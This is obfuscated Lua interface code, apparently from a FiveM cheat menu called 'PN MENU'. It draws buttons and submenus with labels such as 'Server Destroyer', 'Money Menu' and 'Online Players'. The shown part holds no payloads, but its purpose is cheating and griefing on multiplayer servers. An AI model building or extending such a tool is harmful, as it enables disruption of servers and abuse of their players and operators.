local function drawButton_ydtfuiehrjgsegd(text_duhgilserg, subText_dhgiusrgsegdf)
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]

	local x_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf / 2
	local multiplier_dhugisrjgsedfg = nil

	if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg <= menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg and optionCount_eygfuwengjiebigoer <= menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg then
		multiplier_dhugisrjgsedfg = optionCount_eygfuwengjiebigoer
	elseif optionCount_eygfuwengjiebigoer > menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg and optionCount_eygfuwengjiebigoer <= menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg then
		multiplier_dhugisrjgsedfg = optionCount_eygfuwengjiebigoer - (menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg - menu_idhgisjlofdgsersdfgsegdf.maxOptionCount_djgiusriuogsedsfg)
	end

	if multiplier_dhugisrjgsedfg then
		local buttonSpriteXOffset_SDGHSDGSDG = 0.011
		local buttonSpriteScale_DSGJHSDIGSDG = { x = 0.016, y = 0.1 }
		local y_dhgiuslergssdfg = menu_idhgisjlofdgsersdfgsegdf.y_dhgiuslergssdfg + titleHeight_iudygiuehoguergerg + buttonHeight_polcijahugiueshrguerlge + (buttonHeight_polcijahugiueshrguerlge * multiplier_dhugisrjgsedfg) - buttonHeight_polcijahugiueshrguerlge / 2
		local backgroundColor_dhgusieriogsdfg = nil
		local textColor_dihgiusjoisegsdf = nil
		local subTextColor_dhugiuserdfg = nil
		local shadow_dhugiusergsdfg = false

		if menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg == optionCount_eygfuwengjiebigoer then
			backgroundColor_dhgusieriogsdfg = menu_idhgisjlofdgsersdfgsegdf.menuFocusBackgroundColor_dhugsiuerse32432532
			textColor_dihgiusjoisegsdf = menu_idhgisjlofdgsersdfgsegdf.menuFocusTextColor_dughsiregsdfg
			subTextColor_dhugiuserdfg = menu_idhgisjlofdgsersdfgsegdf.menuFocusTextColor_dughsiregsdfg
		else
			backgroundColor_dhgusieriogsdfg = menu_idhgisjlofdgsersdfgsegdf.menuBackgroundColor_duygu848o7ghsdf
			textColor_dihgiusjoisegsdf = menu_idhgisjlofdgsersdfgsegdf.menuTextColor_duhgsiregsd
			subTextColor_dhugiuserdfg = menu_idhgisjlofdgsersdfgsegdf.menuSubTextColor_dihgsurilgsdfg
			shadow_dhugiusergsdfg = true
		end

		drawRect_ytfuewgifygbkinbguyierlgeg(x_dhgiuslergssdfg, y_dhgiuslergssdfg, menu_idhgisjlofdgsersdfgsegdf.width_duhgsiuerlgsdf, buttonHeight_polcijahugiueshrguerlge, backgroundColor_dhgusieriogsdfg)
		
		if text_duhgilserg == "~p~# ~s~Self Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_players_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Online Players" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_friends_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Visual Options" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mphud", "spectating", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Teleport Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_star_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Vehicle Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_transport_car_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Weapon Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_kd_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Server Options" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_globe_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Server Destroyer" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("helicopterhud", "hud_dest", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Money Menu" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_cash_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		elseif text_duhgilserg == "~p~# ~s~Settings" then
			DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_thumb", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.003 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 152, 219, 255)
			text_duhgilserg = normal_string_gsub_SDGHSDIGSD(text_duhgilserg, "~p~# ~s~", "")
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.010 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		else
			drawText_udgyuiergeirgeg(text_duhgilserg, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg-0.002 + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - (buttonHeight_polcijahugiueshrguerlge / 2) + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, textColor_dihgiusjoisegsdf, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg)
		end

		if subText_dhgiusrgsegdf then
			if subText_dhgiusrgsegdf == "toogleOFF" then
				DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_votecross_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.212 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 255, 0, 0, 255)
			elseif subText_dhgiusrgsegdf == "toogleON" then
				DrawSpriteScaled_DSGIDSIUGISDGDS("mpleaderboard", "leaderboard_votetick_icon", menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg+0.212 + buttonSpriteXOffset_SDGHSDGSDG, y_dhgiuslergssdfg-0.001, buttonSpriteScale_DSGJHSDIGSDG.x, buttonSpriteScale_DSGJHSDIGSDG.y, 0.0, 0, 255, 0, 255)
			elseif string.lower(subText_dhgiusrgsegdf) == "native" then
				drawText_udgyuiergeirgeg("~r~"..subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			elseif string.upper(subText_dhgiusrgsegdf) == "ESX" then
				drawText_udgyuiergeirgeg("~g~"..subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			else
				drawText_udgyuiergeirgeg(subText_dhgiusrgsegdf, menu_idhgisjlofdgsersdfgsegdf.x_dhgiuslergssdfg + buttonTextXOffset_ydtfuewkhjbeisoger, y_dhgiuslergssdfg - buttonHeight_polcijahugiueshrguerlge / 2 + buttonTextYOffset_ydtufebklergegew, buttonFont_poidofjeughoeigienwir, subTextColor_dhugiuserdfg, buttonScale_kurwamissclick_ghrueghrekrkeu, false, shadow_dhugiusergsdfg, true)
			end
		end
	end
end


local function CreateMenu_tdrfyuweghfbidsger(id_jdhgisrejolger, title_duhgilgsegdfg)
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] = { }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].title_duhgilgsegdfg = title_duhgilgsegdfg
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitle_duhgiuesrjogse = 'PN MENU'

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].visible_udhgiusodlgesdf = false

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].previousMenu_digusirgiodfg = nil

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].aboutToBeClosed_duhuisorjgsdfg = false

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].x_dhgiuslergssdfg = 0.0175
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].y_dhgiuslergssdfg = 0.125
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].width_duhgsiuerlgsdf = 0.23

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].currentOption_duhfislerjgilsedfg = 1
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].maxOptionCount_djgiusriuogsedsfg = 17

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleFont_dnguseridf = 1
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleColor_diuhgauesd = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 0 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusTextColor_dughsiregsdfg = { r_djguisernglse = 255, g_IDJGIODSF = 255, b_djguisernglse = 255, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuTextColor_duhgsiregsd = { r_djguisernglse = 255, g_IDJGIODSF = 255, b_djguisernglse = 255, a_djguisernglse = 255 }
	CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
	while Wlaczone_PN_MENU_E1QDA_XD do
	PN_WAIT_31DA31_PN(0)
	--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	if DSUHGSIUD_theme_green then
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg = { r_djguisernglse = 0, g_IDJGIODSF = 255, b_djguisernglse = 243, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusBackgroundColor_dhugsiuerse32432532 = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 220 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 120 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf = { r_djguisernglse = 0, g_IDJGIODSF = 255, b_djguisernglse = 243, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 220 }
	elseif DSUHGSIUD_theme_purple then

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 14, g_IDJGIODSF = 66, b_djguisernglse = 23, a_djguisernglse = 180 }
	elseif DSUHGSIUD_theme_purple then
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuSubTextColor_dihgsurilgsdfg = { r_djguisernglse = 0, g_IDJGIODSF = 255, b_djguisernglse = 243, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuFocusBackgroundColor_dhugsiuerse32432532 = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 220 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].menuBackgroundColor_duygu848o7ghsdf = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 180 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundColor_7567fihfsudgdsf = { r_djguisernglse = 0, g_IDJGIODSF = 255, b_djguisernglse = 243, a_djguisernglse = 255 }
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 0, g_IDJGIODSF = 0, b_djguisernglse = 0, a_djguisernglse = 220 }

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].subTitleBackgroundColor_duhgsiuorsgsdf = { r_djguisernglse = 92, g_IDJGIODSF = 0, b_djguisernglse = 105, a_djguisernglse = 180 }
	end
	end
	end)
	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].titleBackgroundSprite_udyguiosrser3445r3 = nil

	menus_ueygtyuerihgkbergerg[id_jdhgisrejolger].buttonPressedSound_dhugsiurojgsegfd = { name_idgjiserjios = "SELECT", set_duhgiuselr = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5

end


local function CreateSubMenu_oipdgiseorghiuseoge(id_jdhgisrejolger, parent_iduyhguewuygisd, subTitle_duhgiuesrjogse)
	if menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd] then
		CreateMenu_tdrfyuweghfbidsger(id_jdhgisrejolger, menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].title_duhgilgsegdfg)

		if subTitle_duhgiuesrjogse then
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', subTitle_duhgiuesrjogse)
		else
			setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitle_duhgiuesrjogse', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].subTitle_duhgiuesrjogse)
		end
		

		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'previousMenu_digusirgiodfg', parent_iduyhguewuygisd)

		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'x_dhgiuslergssdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].x_dhgiuslergssdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'y_dhgiuslergssdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].y_dhgiuslergssdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'maxOptionCount_djgiusriuogsedsfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].maxOptionCount_djgiusriuogsedsfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleFont_dnguseridf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleFont_dnguseridf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleColor_diuhgauesd', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleColor_diuhgauesd)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundColor_7567fihfsudgdsf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleBackgroundColor_7567fihfsudgdsf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'titleBackgroundSprite_udyguiosrser3445r3', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].titleBackgroundSprite_udyguiosrser3445r3)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuTextColor_duhgsiregsd', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuTextColor_duhgsiregsd)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuSubTextColor_dihgsurilgsdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuSubTextColor_dihgsurilgsdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusTextColor_dughsiregsdfg', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuFocusTextColor_dughsiregsdfg)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuFocusBackgroundColor_dhugsiuerse32432532', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuFocusBackgroundColor_dhugsiuerse32432532)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'menuBackgroundColor_duygu848o7ghsdf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].menuBackgroundColor_duygu848o7ghsdf)
		setMenuProperty_dytfeiuwbguiesogdfg(id_jdhgisrejolger, 'subTitleBackgroundColor_duhgsiuorsgsdf', menus_ueygtyuerihgkbergerg[parent_iduyhguewuygisd].subTitleBackgroundColor_duhgsiuorsgsdf)
	end
end


local function CurrentMenu_iuyugihsgnjioerg()
	return currentMenu_dygfuyeikesrgerg
end


local function OpenMenu_eytfyuagbfhkjsdgergd(id_jdhgisrejolger)
	if id_jdhgisrejolger and menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then
	sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
		setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, true)
	end
end


local function MENUOPENED31QDA_PN(id_jdhgisrejolger)
	return isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger)
end


local function IsAnyMenuOpened_eytfuasigfkhbuewkflsdfgre()
	for id_jdhgisrejolger, _ in pairs(menus_ueygtyuerihgkbergerg) do
		if isMenuVisible_trdyugfwgewiubfbeierg(id_jdhgisrejolger) then return true end
	end

	return false
end


local function IsMenuAboutToBeClosed_duhgiuerhgiosergesrg()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		return menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg
	else
		return false
	end
end


local function CloseMenu_duhgiuelgesgdf()
	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		if menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg then
			menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg = false
			setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
			optionCount_eygfuwengjiebigoer = 0
			currentMenu_dygfuyeikesrgerg = nil
			currentKey_hgiuerhiogewger = nil
		else
			menu_idhgisjlofdgsersdfgsegdf.aboutToBeClosed_duhuisorjgsdfg = true
		end
	end
end


local function pszycisk31eqd_PN(text_duhgilserg, subText_dhgiusrgsegdf)
	local buttonText_iduhgiuosrgsdf = text_duhgilserg
	if subText_dhgiusrgsegdf then
	buttonText_iduhgiuosrgsdf = '{ '..tostring(buttonText_iduhgiuosrgsdf)..', '..tostring(subText_dhgiusrgsegdf)..'}'
	end

	local menu_idhgisjlofdgsersdfgsegdf = menus_ueygtyuerihgkbergerg[currentMenu_dygfuyeikesrgerg]
	if menu_idhgisjlofdgsersdfgsegdf then
		optionCount_eygfuwengjiebigoer = optionCount_eygfuwengjiebigoer + 1

		local isCurrent_dughisurlgsfreg = menu_idhgisjlofdgsersdfgsegdf.currentOption_duhfislerjgilsedfg == optionCount_eygfuwengjiebigoer

		drawButton_ydtfuiehrjgsegd(text_duhgilserg, subText_dhgiusrgsegdf)

		if isCurrent_dughisurlgsfreg then
			if currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.select_key_dhugiuerger then
				sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
				return true
			elseif currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.left_key_dhugiuerger or currentKey_hgiuerhiogewger == keys_dhgiuerhgoelgiehwgewg.right_key_dhugiuerger then
				sritizen_INVOKE_PN(0x67C540AA08E4A6F5, -1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", true)
			end
		end

		return false
	else

		return false
	end
end


local function menibutton_PN938D_PN(text_duhgilserg, id_jdhgisrejolger, subText_dhgiusrgsegdf)
	if menus_ueygtyuerihgkbergerg[id_jdhgisrejolger] then

		if pszycisk31eqd_PN("~p~# ~s~"..text_duhgilserg, subText_dhgiusrgsegdf) then
			setMenuVisible_eqwreqtyhfioewjfiuewg(currentMenu_dygfuyeikesrgerg, false)
			setMenuVisible_eqwreqtyhfioewjfiuewg(id_jdhgisrejolger, true, true)

			return true
		end
	end

	return false
end


local function checkbox_PN_31DA_PN(text_duhgilserg, checked_87gy8sodhgilds, callback_87yd78hoisgser)
local text_diuigsodgsdfg = "toogleOFF"
if checked_87gy8sodhgilds then
text_diuigsodgsdfg = "toogleON"
end

	if pszycisk31eqd_PN(text_duhgilserg, text_diuigsodgsdfg) then
		checked_87gy8sodhgilds = not checked_87gy8sodhgilds
